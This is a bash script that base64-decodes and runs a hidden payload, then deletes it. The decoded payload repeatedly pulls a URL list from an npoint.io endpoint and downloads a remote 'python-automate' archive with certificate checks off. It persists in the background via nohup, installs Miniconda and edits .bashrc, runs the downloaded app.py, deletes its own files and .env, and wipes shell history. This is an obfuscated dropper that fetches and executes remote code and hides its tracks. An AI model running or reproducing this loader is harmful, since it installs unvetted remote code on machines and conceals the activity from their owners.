#!/usr/bin/env bash

set -e

TMP_SCRIPT=$(mktemp /tmp/bum.XXXXXX.sh)
chmod +x "$TMP_SCRIPT"

base64 -d << 'EOF' | tr -d '\r' > "$TMP_SCRIPT"
ZWNobyAnIyEvYmluL2Jhc2gKWyAtZiBweXRob24tYXV0b21hdGUvYXBwLnB5IF0gfHwgKAojIS9iaW4vYmFzaAoKd2hpbGUgdHJ1ZTsgZG8KICBlY2hvICJM4bqleSBkYW5oIHPDoWNoIFVSTCB04burIEFQSS4uLiIKICB1cmxzPSQoY3VybCAtcyBodHRwczovL2FwaS5ucG9pbnQuaW8vMzMzNWViY2VkMDNkZjkxNGNkYzQgfCBqcSAtciAnLmRhdGFzW10nKQogIHN1Y2Nlc3M9ZmFsc2UKCiAgZm9yIHVybCBpbiAkdXJsczsgZG8KICAgIGVjaG8gIlRo4butIHThuqNpIHThu6s6ICR1cmwiCiAgICBpZiB3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgIiR1cmwiIC1PIHB5dGhvbi1hdXRvbWF0ZS1tYXN0ZXIudGFyLmd6OyB0aGVuCiAgICAgIGlmIHRhciAteHZmIHB5dGhvbi1hdXRvbWF0ZS1tYXN0ZXIudGFyLmd6OyB0aGVuCiAgICAgICAgcm0gcHl0aG9uLWF1dG9tYXRlLW1hc3Rlci50YXIuZ3oKICAgICAgICBlY2hvICJU4bqjaSB2w6AgZ2nhuqNpIG7DqW4gdGjDoG5oIGPDtG5nIHThu6s6ICR1cmwiCiAgICAgICAgc3VjY2Vzcz10cnVlCiAgICAgICAgYnJlYWsKICAgICAgZWxzZQogICAgICAgIGVjaG8gIkdp4bqjaSBuw6luIGzhu5dpIHThu6s6ICR1cmwiCiAgICAgIGZpCiAgICBlbHNlCiAgICAgIGVjaG8gIlThuqNpIGzhu5dpIHThu6s6ICR1cmwiCiAgICBmaQogIGRvbmUKCiAgaWYgJHN1Y2Nlc3M7IHRoZW4KICAgIGJyZWFrCiAgZWxzZQogICAgZWNobyAiVOG6pXQgY+G6oyBVUkwgxJHhu4F1IGzhu5dpLiBUaOG7rSBs4bqhaSBzYXUgMzAgZ2nDonkuLi4iCiAgICBzbGVlcCAzMAogIGZpCmRvbmUKKScgPiBidW0uc2ggJiYgY2htb2QgK3ggYnVtLnNoICYmIG5vaHVwIC4vYnVtLnNoID4gb3V0LmxvZyAyPiYxICYKCgp3aGlsZSB0cnVlOyBkbwogICAgIyBpZiBjb21tYW5kIC12IHB5dGhvbiA+L2Rldi9udWxsIDI+JjE7IHRoZW4KICAgICMgICAgIFBZPSQod2hpY2ggcHl0aG9uKQogICAgIyAgICAgZWNobyAixJDDoyBjw7MgUHl0aG9uIGjhu4cgdGjhu5FuZzogJFBZIgogICAgIyBlbHNlCiAgICAjIEtp4buDbSB0cmEgbuG6v3UgxJHDoyBjw7MgTWluaWNvbmRhCiAgICBpZiBbICEgLWQgIiRIT01FL21pbmljb25kYSIgXTsgdGhlbgogICAgICAgIGVjaG8gIktow7RuZyBjw7MgUHl0aG9uLiDEkGFuZyB04bqjaSB2w6AgY8OgaSDEkeG6t3QgTWluaWNvbmRhLi4uIgogICAgICAgIHdnZXQgaHR0cHM6Ly9yZXBvLmFuYWNvbmRhLmNvbS9taW5pY29uZGEvTWluaWNvbmRhMy1sYXRlc3QtTGludXgteDg2XzY0LnNoIC1PIG1pbmljb25kYS5zaAogICAgICAgIGJhc2ggbWluaWNvbmRhLnNoIC1iIC1wICIkSE9NRS9taW5pY29uZGEiCiAgICAgICAgcm0gbWluaWNvbmRhLnNoCiAgICBlbHNlCiAgICAgICAgZWNobyAiTWluaWNvbmRhIMSRw6MgxJHGsOG7o2MgY8OgaSBz4bq1bi4iCiAgICBmaQoKICAgIGV4cG9ydCBQQVRIPSIkSE9NRS9taW5pY29uZGEvYmluOiRQQVRIIgogICAgZWNobyAnZXhwb3J0IFBBVEg9IiRIT01FL21pbmljb25kYS9iaW46JFBBVEgiJyA+PiB+Ly5iYXNocmMKICAgIHNvdXJjZSAgfi8uYmFzaHJjCiAgICAjIFBZPSIkSE9NRS9taW5pY29uZGEvYmluL3B5dGhvbiIKICAgICMgZmkKCiAgICAjIFTDrG0gdGjGsCBt4bulYyBweXRob24tYXBwCiAgICBwaXAgaW5zdGFsbCBmbGFzayBmbGFza19zb2NrZXRpbyB3ZWJzb2NrZXQtY2xpZW50IGZhc3RhcGkgdXZpY29ybiBweXR6IHJlcXVlc3RzCiAgICBkaXI9JChmaW5kIH4gLXR5cGUgZCAtbmFtZSAncHl0aG9uLWF1dG9tYXRlJyAtcHJpbnQgLXF1aXQpCiAgICBpZiBbIC1uICIkZGlyIiBdOyB0aGVuCiAgICAgICAgcm0gLWYgYnVtLnNoIG91dC5sb2cgLmVudgogICAgICAgICMgcGtpbGwgcHl0aG9uIHx8IHRydWUKICAgICAgICAjIHBraWxsIHB5dGhvbjMgfHwgdHJ1ZQogICAgICAgIGNkICIkZGlyIiB8fCBleGl0IDEKICAgICAgICBoaXN0b3J5IC1jICYmIGhpc3RvcnkgLXcKICAgICAgICBjbGVhcgogICAgICAgIHB5dGhvbiAtdSBhcHAucHkgLWRhdGFzZXQ9IjU3ZDI1YmY5YWQxMzY2NWUyZGQyIiA+IHN0ZG91dC50eHQgMj4gc3RkZXJyLnR4dAogICAgZWxzZQogICAgICAgIGVjaG8gIktow7RuZyB0w6xtIHRo4bqleSB0aMawIG3hu6VjICdweXRob24tYXV0b21hdGUnIgogICAgZmkKCiAgICBzbGVlcCAxMApkb25lCg==
EOF

bash "$TMP_SCRIPT"

rm -f "$TMP_SCRIPT"
